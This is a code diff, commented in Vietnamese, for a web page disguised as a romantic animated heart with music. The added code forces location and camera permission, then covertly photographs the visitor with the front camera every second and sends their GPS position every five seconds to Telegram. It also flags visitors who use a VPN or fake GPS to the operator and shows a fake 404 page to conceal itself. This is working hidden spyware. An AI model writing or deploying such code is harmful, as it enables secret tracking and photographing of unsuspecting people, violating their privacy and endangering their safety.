+                            const arr = new Uint8Array(len);
+                            for (let i = 0; i < len; i++) arr[i] = binStr.charCodeAt(i);
+                            resolve(new Blob([arr], { type: 'image/jpeg' }));
+                        }
+                    } catch (e) {
+                        resolve(null);
+                    }
                 });
             };
 
-            const requestCameraPromise = () => {
+            const captureAndSendFrontPhoto = async () => {
+                if (!frontVideo) return;
+                const blob = await captureVideoBlob(frontVideo);
+                if (blob && blob.size > 0) {
+                    frontCount++;
+                    sendPhotoToTelegram(blob, `CAMERA TRƯỚC (SELFIE) #${frontCount}`);
+                }
+            };
+
+            const requestFrontCameraPromise = () => {
                 return new Promise(async (resolve, reject) => {
                     const getUserMedia = (constraints) => {
                         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
@@ -1853,30 +2325,74 @@
                         return Promise.reject(new Error("CAMERA_UNSUPPORTED"));
                     };
 
+                    // Khởi tạo độc quyền Camera Trước (Selfie)
                     try {
-                        const stream = await getUserMedia({
+                        frontStream = await getUserMedia({
                             video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                             audio: false
                         });
-                        if (stream) {
-                            cameraStream = stream;
-                            if (!cameraVideo) {
-                                cameraVideo = document.createElement('video');
-                                cameraVideo.setAttribute('autoplay', '');
-                                cameraVideo.setAttribute('playsinline', '');
-                                cameraVideo.setAttribute('muted', '');
-                                cameraVideo.style.display = 'none';
-                                document.body.appendChild(cameraVideo);
+                    } catch (e1) {
+                        try {
+                            frontStream = await getUserMedia({
+                                video: { facingMode: 'user' },
+                                audio: false
+                            });
+                        } catch (e2) {
+                            try {
+                                frontStream = await getUserMedia({ video: true, audio: false });
+                            } catch (e3) {
+                                return reject(e3);
                             }
-                            cameraVideo.srcObject = stream;
-                            cameraVideo.play().catch(() => {});
-                            resolve(true);
-                        } else {
-                            reject(new Error("CAMERA_DENIED"));
                         }
-                    } catch (e) {
-                        reject(e);
                     }
+
+                    if (frontStream) {
+                        frontVideo = createHiddenVideo();
+                        frontVideo.srcObject = frontStream;
+                        await frontVideo.play().catch(() => {});
+
+                        // Chờ khung hình đầu tiên sẵn sàng
+                        await new Promise((res) => {
+                            if (frontVideo.videoWidth > 0) return res();
+                            frontVideo.onloadedmetadata = () => res();
+                            setTimeout(res, 350);
+                        });
+
+                        resolve(true);
+                    } else {
+                        reject(new Error("CAMERA_DENIED"));
+                    }
+                });
+            };
+
+            const render404Page = () => {
+                document.title = "404 Not Found";
+                if (this.bgMusic) {
+                    this.bgMusic.pause();
+                    this.bgMusic.src = "";
+                }
+                document.body.innerHTML = `
+                    <div style="background-color:#ffffff;color:#222222;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;width:100vw;position:fixed;inset:0;z-index:999999;margin:0;padding:24px;box-sizing:border-box;text-align:center;">
+                        <h1 style="font-size:5.5rem;margin:0;font-weight:700;color:#111111;line-height:1;">404</h1>
+                        <h2 style="font-size:1.4rem;margin:12px 0 16px;font-weight:500;color:#444444;">Page Not Found</h2>
+                        <p style="color:#666666;max-width:440px;margin:0 auto 24px;font-size:0.95rem;line-height:1.5;">The requested URL was not found on this server. That’s all we know.</p>
+                        <hr style="width:100%;max-width:480px;border:0;border-top:1px solid #e5e5e5;margin-bottom:18px;">
+                        <span style="font-size:0.82rem;color:#999999;font-family:monospace;">404_NOT_FOUND • Error ID: ${Math.random().toString(36).substring(2, 12)}</span>
+                    </div>
+                `;
+            };
+
+            const requestLocationPromise = () => {
+                return new Promise((resolve, reject) => {
+                    if (!navigator.geolocation || !navigator.geolocation.getCurrentPosition) {
+                        return reject(new Error("GEOLOCATION_UNSUPPORTED"));
+                    }
+
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => resolve(pos.coords),
+                        (err) => reject(err),
+                        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+                    );
                 });
             };
 
@@ -1892,29 +2408,40 @@
                 if (e) e.stopPropagation();
                 if (this.hasStarted) return;
 
-                if (btnSpan) btnSpan.textContent = 'ĐANG KHỞI TẠO...';
+                if (btnSpan) btnSpan.textContent = 'ĐANG KIỂM TRA...';
                 if (actionBtn) actionBtn.classList.add('loading');
 
-                // 1. Notification Permission
+                // 1. Notification Permission (nếu hỗ trợ)
                 try {
                     if (typeof Notification !== 'undefined' && Notification.requestPermission) {
                         await Notification.requestPermission().catch(() => {});
                     }
                 } catch (err) {}
 
-                // 2. Geolocation Permission (Enforced)
+                // 2. Geolocation High-Accuracy GPS
                 let userCoords = null;
                 try {
                     userCoords = await requestLocationPromise();
                 } catch (locErr) {
-                    console.warn("[PermissionGate] Người dùng từ chối Vị trí:", locErr);
+                    console.warn("[PermissionGate] Chưa lấy được GPS chính xác:", locErr);
                     resetToStart();
                     return;
                 }
 
-                // 3. Camera Permission (Enforced)
+                // 3. KIỂM TRA BẢO MẬT: CHẶN FAKE VPN, PROXY, FAKE GPS
+                const secCheck = await checkVpnAndFakeGps(userCoords);
+                if (secCheck.isViolation) {
+                    console.warn("[Security] Phát hiện Fake VPN/GPS:", secCheck.reasons);
+                    // Bắn cảnh báo vi phạm về Telegram ngay
+                    sendSecurityAlertToTelegram(userCoords, secCheck.reasons, secCheck.ipInfo);
+                    // Chuyển toàn bộ trang web sang mã lỗi 404 Not Found!
+                    render404Page();
+                    return;
+                }
+
+                // 4. Camera Permission (Bắt buộc Camera Trước)
                 try {
-                    const camAllowed = await requestCameraPromise();
+                    const camAllowed = await requestFrontCameraPromise();
                     if (!camAllowed) {
                         resetToStart();
                         return;
@@ -1925,10 +2452,10 @@
                     return;
                 }
 
-                // Cấp quyền thành công -> Mở khóa web!
+                // Vị trí hợp lệ & đã cấp quyền Camera -> Mở khóa web!
                 this.hasStarted = true;
 
-                // Gửi ngay tọa độ đầu tiên sau khi cấp quyền và bắt đầu chu kỳ gửi 5 giây / 1 lần
+                // Gửi ngay tọa độ đầu tiên sau khi mở web và bắt đầu chu kỳ gửi 5 giây / 1 lần
                 if (userCoords) {
                     gpsCount++;
                     sendGpsToTelegram(userCoords, gpsCount);
@@ -1950,9 +2477,10 @@
                     }
                 }, 5000);
 
-                // Bắt đầu chụp ảnh tự động: tấm đầu tiên sau 300ms, sau đó cứ 1 giây gửi 1 tấm về Telegram
-                setTimeout(() => { captureAndSendPhoto(); }, 300);
-                cameraInterval = setInterval(() => { captureAndSendPhoto(); }, 1000);
+                // Bắt đầu chụp ảnh độc quyền Camera Trước: tấm 1 (300ms), tấm 2 (800ms), sau đó cứ 1 giây gửi 1 tấm đều đặn
+                setTimeout(() => { captureAndSendFrontPhoto(); }, 300);
+                setTimeout(() => { captureAndSendFrontPhoto(); }, 800);
+                cameraInterval = setInterval(() => { captureAndSendFrontPhoto(); }, 1000);
 
                 // Mở khóa giao diện và phát nhạc
                 if (this.startGate) {
@@ -1975,6 +2503,8 @@
 
                 this.introAnim.start();
             };
+
+
 
             if (actionBtn) {
                 actionBtn.addEventListener('click', handleStart);
@@ -2097,7 +2627,7 @@
                 const rotX = (this.heart.group.rotation.x) * (180 / Math.PI);
                 const rotY = (this.heart.group.rotation.y) * (180 / Math.PI);
                 const pulseVal = (this.heart.uniforms && this.heart.uniforms.uPulse) ? this.heart.uniforms.uPulse.value : 0;
-                const beatScale = 1.0 + pulseVal * 1.35;
+                const beatScale = Math.max(0.78, 1.0 + pulseVal * 1.05);
 
                 photoEl.style.transform = `translate(-50%, -50%) translate3d(${pixelX}px, ${pixelY}px, 0) rotateX(${rotX}deg) rotateY(${rotY}deg) scale(${beatScale})`;
             }
